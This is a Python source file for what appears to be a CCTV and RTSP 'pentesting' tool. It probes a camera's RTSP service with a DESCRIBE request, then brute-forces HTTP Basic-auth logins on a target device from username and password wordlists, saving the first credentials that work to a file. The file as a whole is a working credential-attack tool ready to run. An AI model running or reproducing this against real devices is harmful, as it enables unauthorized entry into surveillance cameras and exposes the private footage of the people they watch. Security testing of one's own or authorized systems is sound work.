import os
import platform
import subprocess
import sys
import time
import socket
from argparse import ArgumentParser, SUPPRESS


"""DEPENDENCY PRE INIT"""

def clear_term():
    os.system('clear' if platform.system() != 'Windows' else 'cls')

def initialize_dependencies():
    required_packages = [
        'termcolor',
        'colorama',
        'pyfiglet',
        'requests']

    installed_flag = ".installed"

    try:
        from colorama import Fore, init
        init(autoreset=True)
    except ImportError:
        clear_term()
        print("\n")
        print("\n       ********** SETTING UP CCTV TOOLSET **********")
        print("\n")
        print("Colorama not found. Installing...")
        subprocess.check_call(
            [sys.executable, "-m", "pip", "install", "colorama"])
        from colorama import Fore, init
        init(autoreset=True)

    if os.path.exists(installed_flag):
        return
    print(f"\nInstalling missing packages: {', '.join(required_packages)}\n\n")

    try:
        subprocess.check_call([sys.executable, '-m', 'pip', '--version'])
    except (subprocess.CalledProcessError, FileNotFoundError):
        print(f"\nError: pip is not installed or not found in your system!"
              f" Please install it first.")
        sys.exit(1)

    try:
        subprocess.check_call([sys.executable,
                               '-m', 'pip', 'install', *required_packages])
        print(f'\nInstallation finished. [✓]')
        time.sleep(2)

        with open(installed_flag, "w") as f:
            f.write("Dependencies installed.")
    except subprocess.CalledProcessError as e:
        print(f'\nAn exception occurred while installing packages: {e}')
        print(f"Installation of one or more packages failed. "
              f"Check the error message above and try again manually.")
        sys.exit(1)
    except Exception as ex:
        print('\nAn exception occurred: \n', ex)
        sys.exit(1)

initialize_dependencies()

from colorama import Fore, init
from utils.banner import Banner
from frameworks.socket_client import SocketClient
from frameworks.file_handler_impl import FileHandlerImpl

class CCTVToolset:
    def __init__(self):
        self.os_name = platform.system()
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.banner = Banner()
        self.network_handler = SocketClient()
        self.file_handler = FileHandlerImpl()

    def run(self):
        """Main entry point for the CCTV Toolset."""
        init(autoreset=True)
        self.banner.display()
        self.main()

    def main(self):
        parser = ArgumentParser(
            description='''-------- Swiss army knife for CCTV & 
            RTSP Pentesting --------''',
            usage='python CCTV-Toolset.py --help',
            epilog='python CCTV-Toolset.py '
                   '--target-ip [IP] '
                   '--target-port [PORT] '
                   '--connection-test [Use provided SOCKET + '
                   'Send HTTP request]',
            add_help=False
        )

        parser.add_argument_group('Required Arguments:')

        parser.add_argument(
            "-t", "--target-ip",
            type=str,
            metavar="<target>",
            help="Target IP of the device with that has the RTSP "
                 "service enabled",
            required=False
        )
        parser.add_argument(
            "-p", "--target-port",
            type=str,
            metavar="<port>",
            help="Target PORT of the device with that has the RTSP "
                 "service enabled",
            required=False
        )
        parser.add_argument(
            "-c", "--connection-test",
            action="store_true",
            help="Test the permission to connect to the device "
                 "using an HTTP request and the provided SOCKET",
            required=False
        )
        parser.add_argument(
            "-d", "--delay",
            type=str,
            metavar="<delay>",
            help="Set the delay time between requests (default is 2s)",
            required=False
        )
        parser.add_argument(
            "-u", "--user",
            type=str,
            metavar="<user>",
            help="Set a single username to brute force",
            required=False
        )
        parser.add_argument(
            "-ul", "--user-wordlist",
            type=str,
            metavar="<userlist>",
            help="Set the path to the wordlist file for "
                 "USERNAME field or SINGLE USERNAME",
            required=False
        )
        parser.add_argument(
            "-pl", "--password-wordlist",
            type=str,
            metavar="<password>",
            help="Set the path to the wordlist file for PASSWORD field",
            required=False
        )
        parser.add_argument(
            "-o", "--out-file-path",
            type=str,
            metavar="<out>",
            help="Set the path to save the result as a file",
            required=False
        )
        parser.add_argument(
            "-fn", "--file-name",
            type=str,
            metavar="<file>",
            help="Set the name of the file that will be saved",
            required=False
        )
        parser.add_argument(
            "-h", "--help",
            action="help",
            default=SUPPRESS,
            help="Show this help message and exit"
        )

        args = parser.parse_args()

        if len(sys.argv) == 1:
            parser.print_help()
            print("\n")
            sys.exit(0)

        if not args.target_ip or not args.target_port:
            self.banner.display()
            parser.print_help()
            sys.exit(1)

        if (args.target_ip and args.target_port
                and args.connection_test and args.connection_test):
            self.rtsp_connect_test(args.target_ip, args.target_port)

        if (args.target_ip and args.target_port and args.password_wordlist
                and args.out_file_path and args.file_name):

            if args.user and args.user_wordlist:
                print(Fore.RED + "[-] ERROR: Use either --user or "
                                 "--user-wordlist, not both." + Fore.RESET)
                sys.exit(1)

            if not args.user and not args.user_wordlist:
                print(Fore.RED + "[-] ERROR: Either --user or "
                                 "--user-wordlist must be provided."
                      + Fore.RESET)
                sys.exit(1)

            delay = args.delay if args.delay else "2"

            self.rtsp_brute(args.target_ip, args.target_port,
                            delay, args.user,
                            args.user_wordlist, args.password_wordlist,
                            args.out_file_path, args.file_name)
        else:
            print(Fore.RED + "\n[-] Exiting...\n" + Fore.RESET)
            sys.exit(1)

    def rtsp_connect_test(self, camera_ip: str, camera_port: int):
        print("  \n           ~~~~~~~ I swear i'll be gentle ~~~~~~~\n\n")
        describe_request = (
            f"DESCRIBE rtsp://{camera_ip}:{camera_port} RTSP/1.0\r\n"
            f"CSeq: 1\r\n"
            f"User-Agent: Chuck Testa\r\n"
            f"\r\n"
        )
        try:
            self.s.settimeout(5)
            print(
                Fore.YELLOW + "[*]" +
                Fore.RESET + f" Connecting to {camera_ip}:{camera_port}...")
            self.s.connect((camera_ip, int(camera_port)))

            print(Fore.YELLOW + "[*]" +
                  Fore.RESET + " Sending DESCRIBE request...")
            self.s.sendall(describe_request.encode())

            print(Fore.YELLOW + "[*]" + Fore.RESET +
                  " Waiting for response...")
            data = self.s.recv(4096)

            if data:
                print(Fore.YELLOW + "[!] " + Fore.RESET + "Response:\n")
                print(Fore.GREEN + data.decode(
                    'utf-8', errors='ignore') + Fore.RESET)
            else:
                print(Fore.RED + "[-]" + Fore.RESET +
                      " No response received from the server.")
        except socket.timeout:
            print(Fore.RED + "[-]" + Fore.RESET +
                  " Connection timed out. The server did not respond.")
        except ConnectionRefusedError:
            print(Fore.RED + "[-]" + Fore.RESET +
                  " Connection refused. The server may be "
                  "down or the port is closed.")
        except Exception as err:
            print(Fore.RED + "[-]" + Fore.RESET +
                  f" An unexpected ERROR occurred: {err}")
        finally:
            self.s.close()

    def rtsp_brute(self, target_device_ip: str, target_device_port: int,
                   set_delay: str, username: str, user_wordlist: str,
                   pass_wordlist: str, output_file_path: str,
                   outputs_file_name: str):

        import requests

        print("  \n       ~~~~~~~ Sometimes we have to use force ~~~~~~~\n\n")

        set_delay_converted = float(set_delay)
        exec_time = time.strftime("%Y/%m/%d %H:%M:%S")
        result_output_name_path = os.path.join(
            output_file_path, f"{outputs_file_name}({exec_time}).txt")

        try:
            if username:
                if not os.path.exists(pass_wordlist):
                    print(
                        Fore.RED + f"[-] ERROR: Password wordlist "
                                   f"file not found: {pass_wordlist}"
                        + Fore.RESET)
                    return

                with open(pass_wordlist, "r") as pass_file:
                    for password in pass_file:
                        password = password.strip()
                        url = f"http://{target_device_ip}:{target_device_port}"
                        auth = (username, password)

                        print(
                            Fore.YELLOW + "[*]" + Fore.RESET + " Trying: "
                            + Fore.BLUE + "Username" + Fore.RESET
                            + f": {username}, " + Fore.MAGENTA +
                            "Password" + Fore.RESET + f": {password}"
                        )

                        try:
                            response = requests.get(url, auth=auth, timeout=5)
                            if response.status_code == 200:
                                successfull_connection = (
                                        Fore.GREEN + "[+] " +
                                        Fore.RESET + "Success! "
                                        + Fore.BLUE + "Username" +
                                        Fore.RESET + f": {username}, "
                                        + Fore.MAGENTA + "Password" +
                                        Fore.RESET + f": {password}"
                                )
                                with open(result_output_name_path, "w") as result_file:
                                    result_file.write(successfull_connection)

                                print(successfull_connection)
                                print(f"File written at: {result_output_name_path}\n")
                                print("Operation terminated.")
                                return
                            else:
                                print(
                                    Fore.RED + "[-]" + Fore.RESET + " Failed: "
                                    + Fore.BLUE + "Username" + Fore.RESET +
                                    f": {username}, "
                                    + Fore.MAGENTA + "Password" + Fore.RESET +
                                    f": {password}"
                                )
                        except requests.RequestException as e:
                            print(
                                Fore.RED + "[-] " + Fore.RESET + "ERROR: "
                                + Fore.BLUE + "Username" + Fore.RESET +
                                f": {username}, "
                                + Fore.BLUE + "Password" + Fore.RESET +
                                f": {password}\n"
                                + Fore.RED + "[-] " + Fore.RESET +
                                f"Error message: {e}"
                            )

                        time.sleep(set_delay_converted)

            elif user_wordlist:
                if not os.path.exists(user_wordlist):
                    print(Fore.RED + f"[-] ERROR: User wordlist file not found: "
                                     f"{user_wordlist}" + Fore.RESET)
                    return
                if not os.path.exists(pass_wordlist):
                    print(Fore.RED + f"[-] ERROR: Password wordlist "
                                     f"file not found: {pass_wordlist}" +
                          Fore.RESET)
                    return

                with open(user_wordlist, "r") as user_file:
                    for user in user_file:
                        user = user.strip()
                        with open(pass_wordlist, "r") as pass_file:
                            for password in pass_file:
                                password = password.strip()
                                url = (f"http://{target_device_ip}:"
                                       f"{target_device_port}")
                                auth = (user, password)

                                print(
                                    Fore.YELLOW + "[*]" + Fore.RESET + " Trying: "
                                    + Fore.BLUE + "Username" + Fore.RESET +
                                    f": {user}, "
                                    + Fore.MAGENTA + "Password" + Fore.RESET +
                                    f": {password}"
                                )

                                try:
                                    response = requests.get(url, auth=auth, timeout=5)
                                    if response.status_code == 200:
                                        successfull_connection = (
                                                Fore.GREEN + "[+] "
                                                + Fore.RESET + "Success! "
                                                + Fore.BLUE + "Username"
                                                + Fore.RESET + f": {user}, "
                                                + Fore.MAGENTA + "Password"
                                                + Fore.RESET + f": {password}"
                                        )
                                        with open(
                                                result_output_name_path, "w"
                                        ) as result_file:

                                            result_file.write(successfull_connection)

                                        print(successfull_connection)
                                        print(f"File written at: "
                                              f"{result_output_name_path}\n")
                                        print("Operation terminated.")
                                        return
                                    else:
                                        print(
                                            Fore.RED + "[-]" + Fore.RESET
                                            + " Failed: " + Fore.BLUE + "Username"
                                            + Fore.RESET + f": {user}, "
                                            + Fore.MAGENTA + "Password"
                                            + Fore.RESET + f": {password}"
                                        )
                                except requests.RequestException as e:
                                    print(
                                        Fore.RED + "[-] " + Fore.RESET + "ERROR: "
                                        + Fore.BLUE + "Username" + Fore.RESET
                                        + f": {user}, "
                                        + Fore.BLUE + "Password" + Fore.RESET
                                        + f": {password}\n"
                                        + Fore.RED + "[-] " + Fore.RESET
                                        + f"Error message: {e}"
                                    )

                                time.sleep(set_delay_converted)
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n[!] User interrupted the script. "
                                "Exiting gracefully..." + Fore.RESET)
            if os.path.exists(result_output_name_path):
                print(Fore.GREEN + f"[+] Successfully wrote results to: "
                                   f"{result_output_name_path}" + Fore.RESET)
        except Exception as e:
            print(
                Fore.RED + "[-] " + Fore.RESET + "ERROR: "
                + Fore.BLUE + "Username" + Fore.RESET
                + f": {username or 'N/A'}, "
                + Fore.BLUE + "Password" + Fore.RESET
                + f": {password if 'password' in locals() else 'N/A'}\n"
                + Fore.RED + "[-] " + Fore.RESET + f"Error message: {e}"
            )


if __name__ == '__main__':
    clear_term()
    CCTVToolset().run()